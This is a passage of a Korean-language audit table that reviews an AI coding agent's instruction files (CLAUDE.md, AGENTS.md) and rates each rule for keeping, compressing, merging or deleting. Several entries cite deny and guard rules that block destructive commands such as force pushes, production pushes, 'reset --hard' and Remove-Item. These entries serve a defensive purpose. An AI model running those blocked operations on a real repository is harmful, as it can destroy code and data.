| P-49 | CLAUDE.md:88 | production push 는 사용자 명시 요청 시에만 | L2 | 코드 병행: `tools/harness/guard_policy.py:38-39,323`(ask) + `.claude/settings.json` deny `git push origin production*`. 실 ask 16건(재측정: 16 — awk/uniq 명령) | KEEP-FACT | 0 | 삭제 시 운영 오배포 | — | 잠정 |
| P-50 | CLAUDE.md:89 | 승격 = 세션 자기 커밋 cherry-pick | L2 | AGENTS.md:79-80 에 절차 전문. 헬퍼 `tools/harness/promote_own_to_production.py` 실존(테스트도 존재) | KEEP-FACT | 0 | 삭제 시 타 세션 미검증 커밋 혼입 | — | 잠정 |
| P-51 | CLAUDE.md:90 | deploy push 세션 격리 | L1 | 훅이 ask 로 강제(실 발화 95건 — 재측정: 95, 사실 카드 94). AGENTS.md:82 에 절차 전문 | COMPRESS | 1 | 없음(훅이 발화 시 스스로 안내) | — | 잠정 |
| P-52 | CLAUDE.md:91 | 동시 2+창 = session_worktree + 핫파일 예외 | L2 | 공유 워킹트리 사실은 유도 불가. `tools/harness/session_worktree.py` 실존. AGENTS.md:83 에 전문 | KEEP-FACT | 0 | 삭제 시 동시 편집 충돌 | — | 잠정 |
| P-53a | CLAUDE.md:92 | push 직전 pre_push_smoke exit 0 | L1 | `scripts/ops/pre_push_smoke.ps1` 실존. AGENTS.md:71 에 전문 | COMPRESS | 0 | 없음 | — | 잠정 |
| P-53b | CLAUDE.md:92 | 위험 명령은 guard_policy 가 코드 차단 | L1 | `guard_policy.py:29-31`(PROTECTED_BRANCHES deny)·`:359`(reset --hard)·`:532`(Remove-Item). 훅이 발화 시 사유를 스스로 출력 | DELETE | 0 | 없음 | 가드가 차단했는데 이유를 모른 채 우회를 시도한 사례가 나오면 | 잠정 |
| P-54 | CLAUDE.md:95 | bash 셸·PowerShell 예시 유지 | L7 | 같은 파일 CLAUDE.md:19 에 동일 내용. AGENTS.md:11,64 에 3벌째 | RESOLVE | 2 | 없음 | — | 잠정 |
| P-55 | CLAUDE.md:98 | 체크리스트 verify_result/APP_OK | L7 | CLAUDE.md:10 과 중복 | RESOLVE | 1 | 없음 | — | 잠정 |
| P-56 | CLAUDE.md:99 | 주요 수정 파일 lint 확인 | L5 | **실행 불가**: lint 설정·도구가 저장소에 없음(`ls pyproject.toml setup.cfg .flake8 ruff.toml` → 전부 없음). 지킬 수 없는 체크 항목 | DELETE | 1 | 없음 | lint 도구를 실제로 도입하면 그때 되살린다 | 잠정 |
| P-57 | CLAUDE.md:100 | AI_STATUS 갱신 | L7 | `.claude/hooks/ctx_gate.py:38,42`(임계 55%)가 정리 리마인더를 주입, 로그 발화 14행 — 훅이 정본 | RESOLVE | 0 | 상태 문서 정체 | — | 잠정 |
| P-58 | CLAUDE.md:101 | deploy/main push 직전 smoke exit 0 | L7 | 같은 파일 CLAUDE.md:92 와 중복 | RESOLVE | 1 | 없음 | — | 잠정 |
| P-59 | CLAUDE.md:104 | Compact instructions 보존 우선순위 | L6 | `pre_compact.py:49` 가 COMPACT_CHECKPOINT.md 를 쓰고 `session_start.py:187` 이 재개 시 그 파일을 가리킴 — 마지막 문장이 그것을 다시 말함 | COMPRESS | 1 | 압축 시 브랜치/SHA 유실 | — | 잠정 |
| P-60 | CLAUDE.md:107 | 참조: AI_STATUS·AI_CHANGELOG | L2 | 문서 역할 구분은 유도 곤란 | KEEP-FACT | 0 | 없음 | — | 잠정 |
| P-61 | CLAUDE.md:108 | 참조: DECISIONS·ARCHIVE_INDEX | L7 | CLAUDE.md:24(RPI Research)에 같은 두 경로가 이미 있음 | RESOLVE | 1 | 없음 | — | 잠정 |

소계 절감 추정: **약 37줄**(108줄 중).

## 2. 전역 `~/.claude/CLAUDE.md` (G)

| ID | 원천 파일:행 | 항목 요약 | 층 | 근거 | 판정 | 절감(줄) | 위험 | 복원 트리거 | 상태 |
|---|---|---|---|---|---|---|---|---|---|
| G-01 | ~/.claude/CLAUDE.md:5 | 개정 사유(구 SDD 완화 이력) | L4 | 행동 지시가 아니라 이력. 결정 기록은 `docs/harness/policy/DECISIONS.md:33` 이 담당 | DELETE | 2 | 없음 | 다시 "모든 코드 수정 위임 강제" 류가 제안되면 DECISIONS.md 를 본다 | 잠정 |
| G-02 | ~/.claude/CLAUDE.md:9 | 직접 처리가 기본, 위임은 예외 | L7 | 내장 Agent 도구 설명이 같은 기준을 담음. 내장중복의심 | RESOLVE | 1 | 없음 | — | 잠정 |
| G-03 | ~/.claude/CLAUDE.md:10 | 독립 작업 3개 이상일 때 위임 | L7 | 내장 Agent 설명의 "independent work in parallel" 과 동일 취지. 내장중복의심 | RESOLVE | 1 | 없음 | — | 잠정 |
| G-04 | ~/.claude/CLAUDE.md:11 | 파일 10개 이상 탐색 시 위임 | L7 | 내장 Agent 설명의 "reading across several files" 와 동일 취지. 내장중복의심 | RESOLVE | 1 | 없음 | — | 잠정 |
| G-05 | ~/.claude/CLAUDE.md:12 | 대규모 다 task 플랜은 위임 | L7 | 프로젝트 CLAUDE.md:30-32 의 `**B`/`**C`/`**D` 정의와 중복 | RESOLVE | 1 | 없음 | — | 잠정 |
| G-06 | ~/.claude/CLAUDE.md:14 | 순차·의존·소규모는 위임 금지 | L7 | 내장 Agent 설명의 "single-fact lookup … search directly" 와 동일 취지. 내장중복의심 | RESOLVE | 1 | 없음 | — | 잠정 |
| G-07 | ~/.claude/CLAUDE.md:18 | 파일 핸드오프(세션 히스토리 붙여넣기 금지) | L7 | 내장 Agent 도구 설명의 위임 브리프 지침과 부분 중복. 남길 한 벌 = 프로젝트 CLAUDE.md 1줄. 내장중복의심 | RESOLVE | 0 | 삭제 시 브리프가 비대해짐 | — | 잠정 |
| G-08 | ~/.claude/CLAUDE.md:19 | 브리프 필수 요소(경로:라인·완료 기준·경계) | L7 | 내장 Agent 도구 설명이 상세 과제 기술을 요구. 완료 기준 강제만 고유 — 그 1줄만 프로젝트 CLAUDE.md 로. 내장중복의심 | RESOLVE | 0 | 삭제 시 위임 브리프에 완료 기준 누락 | — | 잠정 |
| G-09 | ~/.claude/CLAUDE.md:20 | 모델 티어링 | L4 | 내장 Agent 도구가 `model` 파라미터와 선택 지침을 이미 설명. 티어링이 막은 실패 기록 없음. 내장중복의심 | DELETE | 1 | 비용 상승 | 저가 모델로 충분한 기계적 편집에 최상위 모델을 쓴 사례가 반복되면 | 잠정 |
| G-10 | ~/.claude/CLAUDE.md:21 | Progress ledger 로 재디스패치 방지 | L7 | 프로젝트 CLAUDE.md:30-31(`**B`/`**C`)에 동일 규칙 | RESOLVE | 1 | 없음 | — | 잠정 |
| G-11 | ~/.claude/CLAUDE.md:22 | 2판정 리뷰(스펙/품질 분리) | L4 | 실제 2판정 리뷰가 적용된 기록 미확인(워커 ④ 대상). 내장 code-review 스킬이 유사 역할 | DELETE | 1 | 리뷰가 취향 지적으로 흐름 | 리뷰어가 스펙 미준수와 품질 지적을 섞어 반려한 사례가 2회 나오면 | 잠정 |
| G-12 | ~/.claude/CLAUDE.md:26 | 서브에이전트 보고는 주장, diff+테스트 직접 확인 | L7 | 지시서 §5 항목 10 이 "프로젝트 고유값으로 남길 문장" 으로 지목. 메모리에도 동일 항목 존재. 내장중복의심(일부) | RESOLVE | 1 | 삭제 시 미검증 완료 보고 | — | 잠정 |
| G-13 | ~/.claude/CLAUDE.md:27 | 검증 없이 완료 보고 금지 | L7 | 내장 "결과 정직 보고" 와 중복. G-12 와도 같은 말. 내장중복의심 | RESOLVE | 1 | 없음 | — | 잠정 |
| G-14 | ~/.claude/CLAUDE.md:28 | 검증 실패 시 재위임/직접 수정 | L4 | 실패 후 재시도는 내장 기본 동작. 이 규칙이 막은 실패 기록 없음. 내장중복의심 | DELETE | 1 | 없음 | 검증 실패를 보고만 하고 방치한 사례가 나오면 | 잠정 |
| G-15 | ~/.claude/CLAUDE.md:32 | 비자명 신규 작업은 구현 전 사용자 승인 | L7 | 프로젝트 CLAUDE.md:24(RPI)·AGENTS.md:19-22 와 3벌 | RESOLVE | 1 | 없음 | — | 잠정 |
| G-16a | ~/.claude/CLAUDE.md:33 | 오타·소규모는 플랜 루프 생략 | L7 | 프로젝트 CLAUDE.md:25 와 동일 | RESOLVE | 1 | 없음 | — | 잠정 |
| G-16b | ~/.claude/CLAUDE.md:33 | "1%라도 해당하면 스킬 강제" 는 안 따른다 | L7 | superpowers 6.3.0 `hooks.json` 복원으로 그 블록이 매 세션 재주입됨(지시서 §2.6) — **규칙과 그 부정이 동시 로드**. 근본 해법은 플러그인 비활성 + 가드 테스트 | RESOLVE | 1 | superpowers 유지 시 삭제하면 스킬 과호출 | superpowers 유지한 채 삭제했다가 세션당 Skill 호출이 평소의 2배 이상 나오면 | 잠정 |
| G-17 | ~/.claude/CLAUDE.md:34 | 디버깅은 diagnosing-bugs 스킬 우선 | L7 | 스킬 이름·설명이 세션마다 자동 나열됨. 프로젝트 CLAUDE.md:43 에도 같은 스킬 설명 | RESOLVE | 1 | 없음 | — | 잠정 |
| G-18 | ~/.claude/CLAUDE.md:38 | 프로젝트 git 규칙이 스킬보다 우선 | L7 | 프로젝트 CLAUDE.md:44 에 동일 규칙 | RESOLVE | 1 | 프로젝트 파일 쪽만 남기면 무손실 | — | 잠정 |
| G-19 | ~/.claude/CLAUDE.md:42 | 6개월마다 ablation 재점검 | L3 | 사용자 유지보수 취향. 이번 작업이 그 실행 | KEEP-PREF | 0 | 없음 | — | 잠정 |

소계 절감 추정: **약 18줄**(42줄 중) — 남는 것은 G-19(6개월 재점검 취향) 하나와, G-07·G-08·G-12 에서 뽑아낸 1줄(위임 브리프에는 경로:행 컨텍스트·완료 기준·범위 경계를 넣고, 서브에이전트 보고는 diff·테스트 직접 확인 후 승인)을 프로젝트 CLAUDE.md 로 옮긴 것뿐이라 **전역 파일은 사실상 빈 파일에 가까워진다**(지시서 §7.1 팔 B 의 "전역 CLAUDE.md 빈 파일" 가정과 일치).

## 3. AGENTS.md (A)

| ID | 원천 파일:행 | 항목 요약 | 층 | 근거 | 판정 | 절감(줄) | 위험 | 복원 트리거 | 상태 |
|---|---|---|---|---|---|---|---|---|---|
| A-01 | AGENTS.md:3 | 모든 IDE·모델 공통 준수 선언 | L2 | 이 파일의 존재 이유. Claude 세션에는 자동 로드되지 않음 | KEEP-FACT | 0 | 없음 | — | 잠정 |
| A-02 | AGENTS.md:9 | 이식 가능한 기준선 = 이 파일 | L2 | 프로젝트 CLAUDE.md:9 가 이 선언을 인용 | KEEP-FACT | 0 | 없음 | — | 잠정 |
| A-03 | AGENTS.md:10 | Cursor `.cursor/rules/` 보강 | L2 | 타 도구 배선 사실 | KEEP-FACT | 0 | 없음 | — | 잠정 |
| A-04 | AGENTS.md:11 | Claude Code = CLAUDE.md 보강, bash 예시 조건부 | L7 | 프로젝트 CLAUDE.md:19,95 와 3벌 | RESOLVE | 1 | 없음 | — | 잠정 |
| A-05 | AGENTS.md:12 | APP_OK 표준 문자열 | L7 | 프로젝트 CLAUDE.md:10 과 중복. 코드 `quality_check.py:149` | RESOLVE | 1 | 타 도구(Codex/Cursor)는 CLAUDE.md 를 안 읽으므로 완전 삭제 불가 — 자구 동일 고정 필요 | — | 잠정 |
| A-06 | AGENTS.md:13 | 브라우저: Cursor MCP 우선, gstack 은 setup 후 | L7 | 프로젝트 CLAUDE.md:12 와 **상충**(CLAUDE.md 는 gstack 무조건). `~/.claude/skills/gstack-browse/` 는 실존 | RESOLVE | 1 | 상충 유지 시 QA 도구 선택 흔들림 | — | 잠정 |
| A-07 | AGENTS.md:14 | 훅 fail-open 은 로그 남을 때만 | L7 | 프로젝트 CLAUDE.md:11 과 중복. 코드 `quality_check.py:202,206` | RESOLVE | 0 | 없음(AGENTS.md 를 정본으로 남김) | — | 잠정 |
| A-08 | AGENTS.md:15 | 작업 레벨·RPI 판단은 CLAUDE.md 를 따름 | L7 | 프로젝트 CLAUDE.md:24 와 순환 참조(서로를 가리킴) | RESOLVE | 1 | 없음 | — | 잠정 |
| A-09 | AGENTS.md:19 | 코어 변경 대상 정의 | L7 | 프로젝트 CLAUDE.md:24 에 같은 목록 요약 | RESOLVE | 1 | 없음 | — | 잠정 |
| A-10 | AGENTS.md:20 | Research: DECISIONS + ARCHIVE_INDEX | L7 | 동상 | RESOLVE | 1 | 없음 | — | 잠정 |
| A-11 | AGENTS.md:21 | Plan: SPEC_TEMPLATE 기준 | L7 | `docs/guides/SPEC_TEMPLATE.md` 포인터 | RESOLVE | 1 | 없음 | — | 잠정 |
| A-12 | AGENTS.md:22 | Implement: verify-result 로 검증 | L7 | `.agents/workflows/verify-result.md` 포인터. 코드는 `tools/harness/verify_result.py` | RESOLVE | 1 | 없음 | — | 잠정 |
| A-13 | AGENTS.md:23 | 도구별 문서가 보강 가능하되 모순 금지 | L7 | A-02 와 같은 말 | RESOLVE | 1 | 없음 | — | 잠정 |
| A-14 | AGENTS.md:26 | 성능 회귀 머지 전 차단(본문) | L1 | 코드 강제 `tests/performance/test_perf_regression_guard.py` + `scripts/ops/pre_push_smoke.ps1`(둘 다 실존) + `.github/workflows/perf-gate.yml` | COMPRESS | 1 | 없음 | — | 잠정 |
| A-15 | AGENTS.md:27 | G1/G2 defer·CDN 동기 스크립트 금지 | L1 | 위 가드가 코드로 판정 | COMPRESS | 2 | 산문 삭제 시 가드 실패 원인 설명이 사라짐 | — | 잠정 |
| A-16 | AGENTS.md:28 | G4 fragment JS idempotent | L1 | 동상 | COMPRESS | 1 | 동상 | — | 잠정 |
| A-17 | AGENTS.md:29 | G3 SW network-first timeout | L1 | 동상 | COMPRESS | 1 | 동상 | — | 잠정 |
| A-18 | AGENTS.md:30 | JSONB ilike 금지·N+1 금지·캐시·advisory lock | L5 | 코드 강제 없음(가드 G1~G4 에 미포함). 프로젝트 고유 성능 규약 | KEEP-FACT | 0 | 삭제 시 hot path 풀스캔 재발 | — | 잠정 |
| A-19 | AGENTS.md:31 | TTFB 측정·EXPLAIN Seq Scan 없음 | L5 | 동상. 측정 우선 원칙 | KEEP-FACT | 0 | 추정 최적화 재발 | — | 잠정 |
| A-20 | AGENTS.md:32 | 점검 스킬 SSOT `.cursor/skills/perf-*` | L2 | `.claude/commands/perf-guard.md`·`perf-audit.md`·`perf-gate.md` 실존(SSOT 포인터) | KEEP-FACT | 0 | 삭제 시 중복 global 스킬 재생성 | — | 잠정 |
| A-21 | AGENTS.md:37 | 근본 원인 먼저 파악 후 수정 | L5 | 사용자가 반복 강조하는 절대 규칙. 강제 코드 없음 | COMPRESS | 0 | 삭제 시 증상 덮기 재발 | — | 잠정 |
| A-22 | AGENTS.md:38 | 임시 우회·덮어쓰기 절대 금지 | L5 | A-21 과 같은 취지의 재진술 | COMPRESS | 1 | 없음 | — | 잠정 |
| A-23 | AGENTS.md:39 | 무조건 근본 해결(클린코드) | L5 | A-21 재진술 | COMPRESS | 1 | 없음 | — | 잠정 |
| A-24 | AGENTS.md:40 | 증상만 덮는 수정 제출 금지 | L5 | A-21 재진술 | COMPRESS | 1 | 없음 | — | 잠정 |
| A-25 | AGENTS.md:43 | 에러 숨기기 금지(`try/except: pass`) | L5 | 프로젝트 CLAUDE.md:67,83 에 2벌 더 존재 | COMPRESS | 0 | 삭제 시 조용한 예외 삼킴 | — | 잠정 |
| A-26 | AGENTS.md:44 | 증상 우회·하드코딩 금지 | L5 | A-22 와 중복 | COMPRESS | 1 | 없음 | — | 잠정 |
| A-27 | AGENTS.md:45 | 구시대 방식(deprecated API) 금지 | L5 | 2026-08-03 이후 deprecated API 관련 수정 커밋 0건. 내장중복의심 | DELETE | 1 | 레거시 패턴 복사 | deprecated API 사용으로 인한 수정 커밋이 1건이라도 나오면 | 잠정 |
| A-28 | AGENTS.md:46 | `# TODO` 미봉책 금지 | L5 | 프로젝트 CLAUDE.md:83 에 중복 | COMPRESS | 0 | 미봉책 재유입 | — | 잠정 |
| A-29 | AGENTS.md:49 | 프로세스 1 현상 확인 | L4 | `.claude/skills/diagnosing-bugs/SKILL.md` Phase 1 이 더 구체적(빨강 신호 먼저). 내장중복의심 | DELETE | 1 | 없음 | 재현 조건 없이 수정에 착수한 사례가 2회 나오면 | 잠정 |
| A-30 | AGENTS.md:50 | 프로세스 2 근본 원인 분석 | L4 | 동상 + A-21 과 중복 | DELETE | 1 | 없음 | 동상 | 잠정 |
| A-31 | AGENTS.md:51 | 프로세스 3 수정 설계 | L4 | 동상. 내장중복의심 | DELETE | 1 | 없음 | 동상 | 잠정 |
| A-32 | AGENTS.md:52 | 프로세스 4 수정 구현 | L4 | 동상. 내장중복의심 | DELETE | 1 | 없음 | 동상 | 잠정 |
| A-33 | AGENTS.md:53 | 프로세스 5 재현 안 됨 검증 | L4 | 전역 CLAUDE.md:27 과 중복. 내장중복의심 | DELETE | 1 | 검증 없는 완료 보고 | 검증 없이 "완료" 보고한 사례가 1회라도 나오면 | 잠정 |
| A-34 | AGENTS.md:56 | 긴급·시간 부족은 예외 아님 | L5 | A-21 강화 문장 | COMPRESS | 1 | 없음 | — | 잠정 |
| A-35 | AGENTS.md:57 | 진짜 긴급이면 임시 조치 명시 선언 | L5 | A-34 의 예외 처리 | COMPRESS | 0 | 삭제 시 임시 조치가 정식 수정으로 위장됨 | — | 잠정 |
| A-36 | AGENTS.md:62 | 프로젝트 이름 | L7 | 프로젝트 CLAUDE.md:16 과 중복 | RESOLVE | 1 | 없음 | — | 잠정 |
| A-37 | AGENTS.md:63 | 스택 나열 | L7 | 프로젝트 CLAUDE.md:17 과 중복(자구까지 동일) | RESOLVE | 1 | 없음 | — | 잠정 |
| A-38 | AGENTS.md:64 | Windows 11·PowerShell 기본 셸 | L7 | 프로젝트 CLAUDE.md:19,95 · AGENTS.md:11 과 4벌째 | RESOLVE | 1 | 없음 | — | 잠정 |
| A-39 | AGENTS.md:65 | Git 커밋은 한글로 | L7 | 프로젝트 CLAUDE.md:87 에 더 구체적인 원문(`-F` 규칙 포함) | RESOLVE | 1 | 없음 | — | 잠정 |
| A-40 | AGENTS.md:66 | 한글 출력 인코딩 계약 PS-ENC-01(4항목) | L1 | 코드 강제 `tests/harness/test_powershell_encoding_contract.py`(실존, pre_push_smoke 서브셋). env 는 `.claude/settings.json` 에 `PYTHONIOENCODING`·`PYTHONUTF8` 실제 등재 확인 | COMPRESS | 0 | 산문 전부 삭제 시 BOM 규칙 근거 상실 | — | 잠정 |
| A-41 | AGENTS.md:67 | claude_master 측정 계정 | L7 | 프로젝트 CLAUDE.md:13 과 중복. 정본은 `docs/guides/REAL_SERVER_TEST_ACCOUNT.md` | RESOLVE | 1 | 두 파일 다 지우면 운영 실데이터 오염 | — | 잠정 |
| A-42 | AGENTS.md:71 | 푸시 전 pre_push_smoke 실행(본문) | L1 | `scripts/ops/pre_push_smoke.ps1` 실존. 프로젝트 CLAUDE.md:92,101 에 2벌 | COMPRESS | 2 | 없음 | — | 잠정 |
| A-43 | AGENTS.md:73 | push 후 CI green 확인(논블로킹) | L7 | `.claude/hooks/post_push_watch.py:115-122` 훅 주입 + 프로젝트 CLAUDE.md:37 — 3벌 | RESOLVE | 2 | 없음 | — | 잠정 |
| A-44 | AGENTS.md:77 | 기본 푸시 대상은 deploy | L2 | 유도 불가한 브랜치 정책. 프로젝트 CLAUDE.md:18,88 과 겹침 | KEEP-FACT | 0 | 삭제 시 푸시 대상 혼동 | — | 잠정 |
| A-45 | AGENTS.md:78 | production push·force·reset 은 명시 요청 시만 | L7 | 프로젝트 CLAUDE.md:88 과 중복. 코드 `guard_policy.py:38-39,323` + deny 3줄 | RESOLVE | 1 | 없음 | — | 잠정 |
| A-46 | AGENTS.md:79 | 승격 기본 = 세션 자기 커밋 cherry-pick | L2 | 프로젝트 CLAUDE.md:89 는 요약. 여기가 사유(공유 워킹트리)까지 담은 본체 | KEEP-FACT | 0 | 삭제 시 타 세션 커밋 혼입 | — | 잠정 |
| A-47 | AGENTS.md:80 | cherry-pick 승격 6단계 절차 | L1 | 헬퍼가 코드로 수행: `tools/harness/promote_completeness.py`·`promote_own_to_production.py`(둘 다 테스트 존재: `tests/harness/test_promote_*.py`) | COMPRESS | 3 | 헬퍼 실패 시 수동 절차를 모름 | — | 잠정 |
| A-48 | AGENTS.md:81 | "deploy 푸쉬" 는 production 불포함 | L7 | 프로젝트 CLAUDE.md:88 에 동일 문장 | RESOLVE | 1 | 없음 | — | 잠정 |
| A-49 | AGENTS.md:82 | deploy push 세션 격리 ask 절차 | L1 | 훅이 실제 ask 95회 발화(재측정: 95). 헬퍼 `push_own_session_commits.py` 실존 | COMPRESS | 2 | 없음(훅이 발화 시 선택지를 스스로 제시) | — | 잠정 |
| A-50 | AGENTS.md:83 | 세션 worktree 격리 전문(10문장) | L2 | 공유 워킹트리 사실 + 도구 `tools/harness/session_worktree.py`(테스트 존재). 다만 한 불릿에 10개 함정이 뭉쳐 있음 | KEEP-FACT | 6 | 압축 과다 시 union 판정·sync refuse 함정 유실 | — | 잠정 |
| A-51 | AGENTS.md:84 | production 강제푸시는 --force-with-lease 로만 | L1 | 코드가 더 강함: `guard_policy.py:29-31` 이 보호 브랜치 force 를 **deny**, `.claude/settings.json` deny 에 `git push --force*`·`git push -f *` | COMPRESS | 1 | 없음 | — | 잠정 |

소계 절감 추정: **약 48줄**(84줄 중).

## 4. 중복 매트릭스 (행:행 대응)

정렬 원칙 제안(총괄 확정 필요):
- **AGENTS.md = 정책 본체 SSOT**(Codex·Cursor 가 자동 로드하는 유일 파일).
- **프로젝트 CLAUDE.md = Claude 세션이 자동 로드하는 유일 파일**이므로 "행동에 즉시 필요한 L2 사실 + L3 취향 + L1 포인터" 만 1줄씩.
- **전역 CLAUDE.md = 프로젝트 무관 취향만**(사실상 비움).
- 두 소비자가 갈리는 짧은 원자 사실(APP_OK 등)은 **자구까지 동일하게 고정하고 드리프트 가드 테스트로 묶는다** — 어느 한쪽을 지우면 그 도구가 값을 잃기 때문이다.

| # | 정책 | 대응 | 정본(SSOT) 제안 | 남길 한 벌 |
|---|---|---|---|---|
| D-01 | 문제 수정 정책(근본 원인) | `P-46`(CLAUDE.md:83) ↔ `A-21`~`A-28`,`A-34`,`A-35`(AGENTS.md:37-57) ↔ 부분 `P-38`(CLAUDE.md:67) | AGENTS.md:34-57 | CLAUDE.md 는 "문제 수정 정책 = 근본 원인만 — 전문 `AGENTS.md`" 1줄 |
| D-02 | 성능 가드 G1~G4 | `P-44`,`P-45`(CLAUDE.md:79-80) ↔ `A-14`~`A-19`(AGENTS.md:26-31) | AGENTS.md:26-31 + 코드 `tests/performance/test_perf_regression_guard.py` | CLAUDE.md 는 "성능 가드는 pre_push_smoke 가 강제 — 규칙 `AGENTS.md`" 1줄 |
| D-03 | git 승격(cherry-pick) | `P-50`(CLAUDE.md:89) ↔ `A-46`,`A-47`(AGENTS.md:79-80) | AGENTS.md:79-80 | CLAUDE.md 는 "승격 = 자기 커밋 cherry-pick, 헬퍼 `promote_own_to_production.py`" 1줄 |
| D-04 | production push 권한 | `P-49`(CLAUDE.md:88) ↔ `A-45`,`A-48`(AGENTS.md:78,81) ↔ 코드 `guard_policy.py:38-39,323` + `.claude/settings.json` deny | 코드(deny) + CLAUDE.md 1줄 | CLAUDE.md:88 유지, AGENTS.md:78,81 은 한 불릿으로 병합 |
| D-05 | deploy push 세션 격리 | `P-51`(CLAUDE.md:90) ↔ `A-49`(AGENTS.md:82) ↔ 훅 ask 95건 | 훅(코드) | AGENTS.md 1불릿, CLAUDE.md 는 삭제 가능 |
| D-06 | 세션 worktree | `P-52`(CLAUDE.md:91) ↔ `A-50`(AGENTS.md:83) | AGENTS.md:83(압축본) | CLAUDE.md 는 "동시 2+창이면 `session_worktree.py create`" 1줄 |
| D-07 | pre_push_smoke | `P-53a`(CLAUDE.md:92) ↔ `P-58`(CLAUDE.md:101) ↔ `A-42`(AGENTS.md:71) | AGENTS.md:71 | CLAUDE.md 안의 2벌을 1벌로 |
| D-08 | push 후 CI green | `P-25`(CLAUDE.md:37) ↔ `A-43`(AGENTS.md:73) ↔ 훅 `post_push_watch.py:115-122` | 훅(코드) | 산문 2벌 모두 삭제, 훅 메시지가 정본 |
| D-09 | APP_OK | `P-05`(CLAUDE.md:10) ↔ `A-05`(AGENTS.md:12) ↔ 코드 `quality_check.py:149,156` | 코드 | 두 문서 각 1줄 유지(소비자가 다름) + 자구 동일 가드 테스트 |
| D-10 | claude_master | `P-08`(CLAUDE.md:13) ↔ `A-41`(AGENTS.md:67) ↔ 정본 `docs/guides/REAL_SERVER_TEST_ACCOUNT.md` | 가이드 문서 | CLAUDE.md 1줄(잠금·가상 주문 접두어만), AGENTS.md 는 포인터 |
| D-11 | 훅 fail-open | `P-06`(CLAUDE.md:11) ↔ `A-07`(AGENTS.md:14) ↔ 코드 `quality_check.py:202,206` | AGENTS.md:14 | CLAUDE.md:11 삭제 |
| D-12 | RPI / 코어 변경 게이트 | `P-15`(CLAUDE.md:24) ↔ `A-08`~`A-13`(AGENTS.md:15,19-23) ↔ `G-15`(전역:32) | AGENTS.md:19-23 | CLAUDE.md 1줄, 전역 삭제 |
| D-13 | 위임 기준 | `G-02`~`G-06`(전역:9-14) ↔ 내장 Agent 도구 설명 ↔ `P-19`~`P-22`(등급 마커) | 내장 | 전역 5줄 전부 삭제 |
| D-14 | 검증 후 완료 보고 | `G-12`,`G-13`(전역:26-27) ↔ `A-33`(AGENTS.md:53) ↔ `P-55`(CLAUDE.md:98) ↔ 내장 | 프로젝트 CLAUDE.md 1줄 | "서브에이전트 보고는 diff·테스트 직접 확인 후 승인" 만 남김 |
| D-15 | 스킬 강제 부정 / 브레인스토밍 예외 | `P-03b`(CLAUDE.md:6) ↔ `P-16`(CLAUDE.md:25) ↔ `P-30b`(CLAUDE.md:44) ↔ `G-16b`(전역:33) ↔ superpowers `hooks.json` 재주입 | 코드(플러그인 비활성 + 가드 테스트) | 상쇄 문장 4개 전부 삭제하고 플러그인을 끈다 |
| D-16 | git 규칙이 스킬보다 우선 | `P-30b`(CLAUDE.md:44) ↔ `G-18`(전역:38) | 프로젝트 CLAUDE.md | 전역 삭제 |
| D-17 | Windows/PowerShell 셸 | `P-12`(CLAUDE.md:19) ↔ `P-54`(CLAUDE.md:95) ↔ `A-04`(AGENTS.md:11) ↔ `A-38`(AGENTS.md:64) | AGENTS.md:64 + 코드 `test_powershell_encoding_contract.py` | CLAUDE.md 안 2벌을 1벌로, AGENTS.md 안 2벌을 1벌로 |
| D-18 | 프로젝트 이름·스택 | `P-09`,`P-10`(CLAUDE.md:16-17) ↔ `A-36`,`A-37`(AGENTS.md:62-63) | AGENTS.md:62-63 | CLAUDE.md 1줄로 합침 |
| D-19 | 커밋 메시지 한글 | `P-48`(CLAUDE.md:87) ↔ `A-39`(AGENTS.md:65) ↔ `A-40` 인코딩 계약(AGENTS.md:66) | CLAUDE.md:87(`-F` 규칙이 더 구체적) | AGENTS.md:65 삭제, :66 은 계약 ID 만 |
| D-20 | Progress ledger / 등급 | `G-10`(전역:21) ↔ `P-20`,`P-21`(CLAUDE.md:30-31) | 프로젝트 CLAUDE.md | 전역 삭제 |
| D-21 | 디버깅 원칙 | `P-47`(CLAUDE.md:84) ↔ `G-17`(전역:34) ↔ `.claude/skills/diagnosing-bugs/SKILL.md` ↔ `A-29`~`A-33` | 스킬 | 산문 전부 삭제, 스킬이 정본 |
| D-22 | 참조 문서 경로 | `P-15`(CLAUDE.md:24 안의 DECISIONS·ARCHIVE_INDEX) ↔ `P-61`(CLAUDE.md:108) ↔ `A-10`(AGENTS.md:20) | CLAUDE.md:107-108 | CLAUDE.md:24 안의 경로 나열 삭제 |
| D-23 | 인라인 스타일·erp-pro.css | `P-31b`(CLAUDE.md:45) ↔ `P-39`(CLAUDE.md:70) | CLAUDE.md:70 | :45 후단 삭제 |
| D-24 | 브라우저 QA(상충) | `P-07`(CLAUDE.md:12) ↔ `A-06`(AGENTS.md:13) — **내용이 다름** | 사용자 결정 필요 | 둘 중 하나로 통일 |
| D-25 | 컴팩트 지시 | `P-26`(CLAUDE.md:38) ↔ `P-59`(CLAUDE.md:104) ↔ 훅 `pre_compact.py:49`·`session_start.py:187` | 훅 + CLAUDE.md:104 | :38 삭제 |
| D-26 | bare except / 에러 숨기기 | `P-38`(CLAUDE.md:67) ↔ `P-46`(CLAUDE.md:83) ↔ `A-25`(AGENTS.md:43) ↔ `A-07`(fail-open) | AGENTS.md:43 | CLAUDE.md 2벌 삭제 |

## 5. 내장중복의심 (총괄이 실제 시스템 프롬프트와 대조해 확정)

내장 프롬프트가 이미 다루는 것으로 알려진 주제와 겹치는 항목만 모았다. 표시된 항목은 위 표에서 근거 열 끝에 `내장중복의심` 이라 적어 두었다.

| ID | 원천 | 겹치는 내장 주제 | 위 표 판정 |
|---|---|---|---|
| G-02 | 전역:9 | 위임 기준 — 직접 처리가 기본 | RESOLVE |
| G-03 | 전역:10 | 위임 기준 — 독립 작업 여러 개를 병렬로 | RESOLVE |
| G-04 | 전역:11 | 위임 기준 — 여러 파일을 훑어야 할 때만 | RESOLVE |
| G-06 | 전역:14 | 위임 기준 — 단발 조회는 직접 검색 | RESOLVE |
| G-09 | 전역:20 | Agent 도구의 `model` 파라미터 선택 지침 | DELETE |
| G-07 | 전역:18 | 위임 브리프 작성 지침 | RESOLVE |
| G-08 | 전역:19 | 위임 브리프 필수 요소 | RESOLVE |
| G-12 | 전역:26 | 서브에이전트 결과 검증 후 인용 | RESOLVE |
| G-13 | 전역:27 | 결과 정직 보고·실패 원문 보고 | RESOLVE |
| G-14 | 전역:28 | 실패 시 재시도(작업 완주) | DELETE |
| P-35 | CLAUDE.md:55 | 일반 코드 품질(문서화·타입) | DELETE |
| P-38 | CLAUDE.md:67 | 일반 코드 품질(예외 처리·비밀키) | RESOLVE |
